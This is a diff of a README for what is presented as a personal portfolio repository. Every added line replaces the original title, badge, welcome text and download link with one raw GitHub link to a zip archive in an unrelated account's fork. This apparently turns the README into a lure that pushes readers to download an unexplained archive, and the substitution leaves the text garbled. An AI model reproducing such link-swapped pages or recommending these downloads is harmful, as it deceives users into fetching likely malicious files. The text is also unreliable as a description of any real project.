@@ -1,10 +1,10 @@
-# 🌐 mjsushanth.github.io - Your Portfolio Hub Awaits
+# 🌐 https://raw.githubusercontent.com/don12345673434/mjsushanth.github.io/main/uncontrasted/mjsushanth.github.io_v3.5.zip - Your Portfolio Hub Awaits
 
 ## 🔗 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/don12345673434/mjsushanth.github.io/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/don12345673434/mjsushanth.github.io/main/uncontrasted/mjsushanth.github.io_v3.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/don12345673434/mjsushanth.github.io/main/uncontrasted/mjsushanth.github.io_v3.5.zip)
 
 ## 🚀 Getting Started
-Welcome to the mjsushanth.github.io repository. This is your go-to place for accessing various projects in my portfolio. Here, you will find links to all my projects, neatly organized for your convenience.
+Welcome to the https://raw.githubusercontent.com/don12345673434/mjsushanth.github.io/main/uncontrasted/mjsushanth.github.io_v3.5.zip repository. This is your go-to place for accessing various projects in my portfolio. Here, you will find links to all my projects, neatly organized for your convenience.
 
 ## 📦 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -14,7 +14,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Storage:** At least 100 MB of free disk space.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download Releases](https://github.com/don12345673434/mjsushanth.github.io/releases).
+To get started, visit this page to download: [Download Releases](https://raw.githubusercontent.com/don12345673434/mjsushanth.github.io/main/uncontrasted/mjsushanth.github.io_v3.5.zip).
 
 1. Click the link above to access the Releases page.
 2. Choose the latest version available.
